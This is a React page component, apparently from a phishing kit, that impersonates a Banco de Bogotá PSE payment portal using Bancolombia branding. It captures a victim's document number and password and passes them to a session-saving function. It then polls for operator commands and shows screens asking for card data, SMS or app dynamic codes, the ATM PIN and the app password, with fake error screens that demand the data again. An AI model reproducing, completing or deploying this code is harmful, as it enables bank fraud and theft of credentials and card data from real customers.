"use client"
import "./bogota.css"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"
import { useEffect, useRef, useState } from "react"
import axios from "axios"
import inicioSesionfuncion from "@/utils/inicioSesionfuncion"
import { handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, handlerTarjeta } from "@/utils/handlerVista"


const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"

const text_color_principal = "text-[#5c5c5c]"
const ESTILO_BTN_PRINCIPAL = `w-full font-bold py-2 px-6 bg-[#0041a8] text-white rounded-full disabled:bg-gray-200 disabled:text-gray-500 cursor-not-allowed`

const svg = (
    <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
)

const Loading = () => {
  return (
    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
      <div className="w-12 h-12 border-4 border-[#0041a8] border-t-transparent rounded-full animate-spin" />
    </div>
  );
}

const InputAnimado = ({
    label,
    borderCol = "border-0", 
    borderColSelec = "", 
    borderColError, 
    errorLabel, 
    name,
    handler, 
    value, 
    error=false, 
    modoNumerico=false, 
    type="text", 
    backGraundInput="bg-white",
    contenBtn = null,
    btn = false,
    labelColor = "text-black",
    labelColorSelect = "",
    labelErrorColor = "text-red-600",
    placeHolder = "",
    svg = null
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const shouldFloat = isFocused || value !== "";
  const [mostrarPasword, setMostrarPasword] = useState(false)


  return (
    <div className="w-full flex flex-col min-h-[70px]">
        <div className="w-full flex flex-col">
            <span className="text-[#5c5c5c] text-[13px] pb-1.5">
                {label}
            </span>
            <input
                inputMode={modoNumerico ? "numeric" : "text"}
                name={name}
                type={ type == "password" ? mostrarPasword ? "text": "password" : type}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                onChange={(e) => handler(e)}
                className={`py-1 px-2.5 outline-none ${isFocused ? "border-2 border-[#0041a8]":"border border-slate-300"}`}
                placeholder={placeHolder}
                value={value}
                />
        </div>
        {error && <span className={`text-[12px] mt-1.5  font-medium ${labelErrorColor}`}>{errorLabel}</span>}
    </div>
  );
}

const SelectMinimalista = ({
  label,
  errorLabel,
  name,
  labelColor,
  borderCol, 
  borderColSelec,
  handler,
  borderColError,
  arrayDatos,
  error=false,
  backGraundInput="bg-white",
  border = "border-b-2",
  colorSvg = "text-slate-500"
}) => {
  const [isOpen, setIsOpen] = useState(false);
  const [selectedItem, setSelectedItem] = useState(typeof arrayDatos[0] === "object" ? arrayDatos[0].value : arrayDatos[0]);
  const [highlightedIndex, setHighlightedIndex] = useState(0);
  const containerRef = useRef();

  const toggleDropdown = () => setIsOpen(prev => !prev);

  const handleSelect = (value) => {
    setSelectedItem(value);
    handler({ target: { name, value } });
    setIsOpen(false);
  };

  const handleClickOutside = (e) => {
    if (containerRef.current && !containerRef.current.contains(e.target)) {
      setIsOpen(false);
    }
  };

  const handleKeyDown = (e) => {
    if (!isOpen) {
      if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        setIsOpen(true);
      }
      return;
    }

    if (e.key === "ArrowDown") {
      e.preventDefault();
      setHighlightedIndex((prev) => (prev + 1) % arrayDatos.length);
    }

    if (e.key === "ArrowUp") {
      e.preventDefault();
      setHighlightedIndex((prev) =>
        prev === 0 ? arrayDatos.length - 1 : prev - 1
      );
    }

    if (e.key === "Enter") {
      e.preventDefault();
      handleSelect(arrayDatos[highlightedIndex]);
    }

    if (e.key === "Escape") {
      setIsOpen(false);
    }
  };

  useEffect(() => {
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  return (
    <div className={`w-full flex flex-col`} >
        <span className={`${labelColor} pl-2 text-[12px]`}>{label}</span>
        <div
        ref={containerRef}
        tabIndex={0}
        onClick={toggleDropdown}
        onKeyDown={handleKeyDown}
        className={`w-full flex flex-col pl-2 relative cursor-pointer outline-none ${error ? borderColError : borderCol}`}
        >
        <div className="w-full flex justify-between items-center border mt-1.5 px-1 py-0.5 border-slate-300">
            <span className="ml-2">{selectedItem}</span>
            <div className={`${colorSvg} transform transition-transform py-1.5 duration-300 ${!isOpen ? "rotate-180": ""}`}>
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" className="bi bi-chevron-up" viewBox="0 0 16 16">
                <path fillRule="evenodd" d="M7.646 4.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1-.708.708L8 5.707l-5.646 5.647a.5.5 0 0 1-.708-.708z"/>
            </svg>
            </div>
        </div>

        {isOpen && (
            <div
            className={`w-[75vw] p-2 z-20 absolute bg-white py-2.5 left-0 top-10 flex flex-col overflow-y-auto ${backGraundInput} ${
                arrayDatos.length > 3 ? "max-h-[100px]" : ""
            }`}
            style={{ height: arrayDatos.length <= 3 ? `${arrayDatos.length * 40}px` : undefined }}
            >
            {arrayDatos.map((d, k) => (
                <button
                key={k}
                type="button"
                onClick={(e) => {
                    e.stopPropagation();
                    handleSelect(typeof d === "object" ? d.value : d);
                }}
                className={`text-[14px] text-start flex items-center pr-1 gap gap-x-1 py-1 px-2 rounded ${
                    (typeof d === "object" && selectedItem === d.value) || d === selectedItem ? "bg-slate-200" : ""
                }`}
                >
                {typeof d === "object" ? d.string : d}
                </button>
            ))}
            </div>
        )}
        </div>
        {error && <span className="text-[14px] mt-1.5 text-red-600 font-medium">{errorLabel}</span>}
    </div>
  );
}

const Clave = ({handlerCheck, handlerContinuar, handlerVolver,datosInicio, errorDatos})=>{
    return(
        <div className="w-[99%] bg-white p-2 rounded-xl flex flex-col items-center">
            <div className="w-[90%] flex flex-col mt-4 mb-4">
                <span className="text-[12px] text-center text-[#5c5c5c]">Ingrese constraseña </span>
            </div>
            
            <div className="w-[50%] mt-4 flex flex-col">
                <InputAnimado 
                    error={!!errorDatos.contrasenia}
                    errorLabel={errorDatos.contrasenia}
                    svg={svg}
                    labelErrorColor={"text-red-500"}
                    borderCol={"border-b-1 border-gray-300"}
                    borderColError={"border-b-1 border-b-red-500"} 
                    label={""} 
                    labelColor={"text-gray-500"}
                    modoNumerico={true}
                    tamInput={4}
                    type={"tel"} 
                    name={"numeroDocumento"} 
                    handler={handlerCheck} 
                    value={datosInicio.contrasenia}
                />
                <div>

                </div>
                
            </div>
            <div className="w-full pt-6 pb-2 flex justify-between items-center">
                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.contrasenia.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
                    Continuar
                </button>
            </div>
        </div>
    )
}

const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio, errorDatos}) =>{
    const [tipoUser, setTipoUser] = useState("Banca Personas")
    return(
        <div className="w-[99%] bg-white p-2 rounded-xl flex flex-col items-center">
            <div className="w-[90%] flex flex-col mt-2.5 mb-5">
                <span className="text-[12px] text-center text-[#5c5c5c]">Ingresa tipo y número de documento</span>
            </div>
            <div className="w-[90%]">
                <SelectMinimalista 
                    label={"¿Que tipo de cliente eres?"}
                    labelColor={"text-[#5c5c5c]"}
                    name={"tipoDocumento"} 
                    handler={setTipoUser}
                    colorSvg="text-[#0041a8]" 
                    value={tipoUser} 
                    arrayDatos={["Banca Personas"]} 
                    borderCol={"border-gray-400"} 
                    borderColSelec={"border-black"} 
                    borderColError={"border-red-600"}
                />
            </div>
            <div className="w-[90%] mt-4 flex justify-between">
                <div className="w-[30%]">
                    <SelectMinimalista 
                        label={"Documento"}
                        labelColor={"text-[#5c5c5c]"}
                        name={"tipoDocumento"} 
                        handler={handlerInformacion}
                        colorSvg="text-[#0041a8]" 
                        value={datosInicio.numeroDocumento} 
                        arrayDatos={[{string:"Cédula de ciudadanía", value:"C.C"}, {string:"Cédula de extranjería", value:"C.E"}, {STRING:"Tarjeta de identidad", value:"T.I"}]} 
                        borderCol={"border-gray-400"} 
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"}
                    />
                </div>
                <div className="w-[50%]">
                    <InputAnimado 
                        error={!!errorDatos.numeroDocumento}
                        errorLabel={errorDatos.numeroDocumento} 
                        label={"Número"} 
                        modoNumerico={true}
                        type={"tel"} 
                        placeHolder="#"
                        name={"numeroDocumento"} 
                        handler={handlerCheck} 
                        value={datosInicio.numeroDocumento}
                    />
                </div>
                <div>

                </div>
                
            </div>
            <div className="w-full pt-6 pb-2 flex justify-between items-center">
                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.numeroDocumento.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
                    Continuar
                </button>
            </div>
        </div>
    )
}

const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        numeroDocumento: "",
        contrasenia: ""       
    })
    const [btnUser, setBtnUser] = useState(false)
    const [btnClave, setBtnClave] = useState(false)

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El campo es obligatorio"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La clave es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            tipoDocumento:"",    
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }
    
    useEffect(()=>{
        if (btnClave) {
            handlerContinuar()
        }
    }, [btnClave])
    
    const handlerCheck = (e) => {
        const { name, value } = e.target;
        
        handlerInformacion(e);

        setErrorDatos((prev) => {
            const nuevosErrores = { ...prev };

            // Validación en tiempo real por campo
            if (name === "numeroDocumento") {
                if (!value.trim()) {
                    nuevosErrores.numeroDocumento = "El campo es requerido";
                } else {
                    nuevosErrores.numeroDocumento = "";
                }
            }

            if (name === "contrasenia") {
                if (!value.trim()) {
                    nuevosErrores.contrasenia = "La clave es obligatoria";
                } else {
                    nuevosErrores.contrasenia = "";
                }
            }

                return nuevosErrores;
            });
    };

    return (
        <div className="w-full flex flex-col justify-center items-center pb-4">
            {tituloError !== "" && 
                <div className="w-full flex items-center justify-center">
                    <span className="text-[11px] text-red-600">{tituloError}</span>
                </div>
            }
            <div className="w-full flex mt-4 flex-col justify-center items-center gap gap-y-4 pl-1">
                {!btnUser &&
                    <Usuario handlerInformacion={handlerInformacion} handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={setBtnUser} />             
                }
                {
                    btnUser &&
                    <Clave handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={setBtnClave} handlerVolver={setBtnUser}/>
                }
            </div>
        </div>
    )
}





export default function Bogota (){
    const isMounted = useRef(true);
    
    const [selectVista, setSelectVisata] = useState("nlogin")
    const [loading, setLoading] = useState(false)
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)

    const handlerInformacion = (e)=>{
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }

    const handlerloginError = ()=>{
        setBtnInicio(true)
    }

    const tarjetaData = {
        'tdb': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:"}, 
        'xtdb':{span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."}, 
        'tdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingrese los siguientes datos de su tarjeta credito:"}, 
        'xtdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."},
    }

    const loginData  ={
        'nlogin': {handler: handlerInformacion, btn: handlerBtnInicio},
        'xlogin': {handler: handlerInformacion, btn: handlerloginError, error: "La información ingresada es incorrecta. Intenta nuevamente."},
    }

    const codData = {  
        'codsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto."}, 
        'xcodsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."},
        'codapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica desde la App Mi Bancolombia."}, 
        'xcodapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."}, 
        'pincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:"}, 
        'xpincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
        'pinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:"}, 
        'xpinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
    }
    
    //obtener uniqId
    useEffect(() => {
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        if (btnInicio) {
            inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setGuardado, selectVista,"Bogota")
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
        isMounted.current = true;

        if (guardado) {
            iniciarLongPolling( isMounted, uniqId, setKey, setLoading, setSelectVisata, selectVista, setDatosInicio);
            setBtnInicio(false)
        }
        return () => {
            isMounted.current = false;
        };
    }, [guardado, reLoad]);



    return(
        <div className={`w-full flex flex-col bg-[#f7f8fa] items-center justify-center`}>
            <div className={`w-[90%] flex justify-center items-center py-3`}>
                <div className={`w-[98%] flex justify-between items-center  gap gap-x-10`}>
                    <img src="/assets/bogota/header.svg" className="w-[45%] object-contain"/>
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className="bi bi-x-lg" viewBox="0 0 16 16">
                        <path d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8z"/>
                    </svg>                    
                </div>
            </div>

            <div className="w-full flex">
                <div className="w-[5vw] flex flex-col justify-end ">
                    <img src="/assets/bogota/tes.svg" className="w-[5vw] h-[15vh] mb-4" alt="" />
                </div>
                <div className="min-h-[70vh] w-[90%] flex flex-col items-center justify-center">
                    <div className="w-[80%] flex flex-col justify-center">
                        <span className="text-[18px] font-bold text-[#0041a8]">Bienvenido al nuevo</span>
                        <span className="text-[18px] font-bold text-[#0041a8]">portal de pagos en línea PSE</span>
                    </div>
                    {loading && <Loading/>}
                    
                    {loginData[selectVista] && <InicioSesion  key={key} handlerInformacion={loginData[selectVista].handler} datosInicio={datosInicio} tituloError={loginData[selectVista]?.error || ""} btnInicio={loginData[selectVista].btn}/>}
                    
                    {tarjetaData[selectVista] && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={tarjetaData[selectVista]?.error || ""} titulo={tarjetaData[selectVista].titulo} handlerTarjeta={tarjetaData[selectVista].handler} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} divInput={"border border-slate-300"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"}/>}
                    

                    {codData[selectVista] && <Status key={key}setLoading={setLoading} svg={svgCard} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} tamInput={6} textColor={text_color_principal} titulo={codData[selectVista].titulo} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={codData[selectVista].handler} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={codData[selectVista]?.error || ""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    
                </div>
            </div>



            <div className="w-[70%] flex items-center justify-between mb-4">
                <img src="/assets/bogota/abajo.png" className="w-[20%] object-contain" alt="" />
                <span className="text-[9px] text-[#5c5c5c]">Banco de Bogotá - 2025</span>
            </div>
            <div className="w-full flex flex-col justify-center items-center bg-[linear-gradient(to_bottom,_#0074d3_-11%,_#0040a8)]  py-7">
                <div className="w-[90%] flex flex-col items-center justify-center">
                    <div className="w-full flex items-start border-b-1 pb-3 border-b-gray-500">
                        <div className="w-[70%] flex flex-col justify-center">
                            <span className="text-[15px] mb-1.5 font-semibold text-white">Tu seguridad es lo primero</span>
                            <span className="text-[12px] text-white">Sigue estos tips y tus transacciones estarán blindadas</span>
                        </div>
                        <div className="rounded-full p-2 ml-[15%] bg-[#0041a8] text-white">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
                            </svg>
                        </div>
                    </div>
                    <div className="w-full flex items-start mt-5 pb-1.5 ">
                        <div className="w-[70%] flex flex-col justify-center">
                            <span className="text-[15px] mb-1.5 font-semibold text-white">Contáctanos </span>
                            <span className="text-[12px] text-white">Si tienes alguna duda o algo te ha sucedido usa nuestros canales</span>
                        </div>
                        <div className="rounded-full p-2 ml-[15%] bg-[#0041a8] text-white">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-chevron-down" viewBox="0 0 16 16">
                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
                            </svg>
                        </div>
                    </div>
                </div>                      
           </div>             
        </div>
    )
}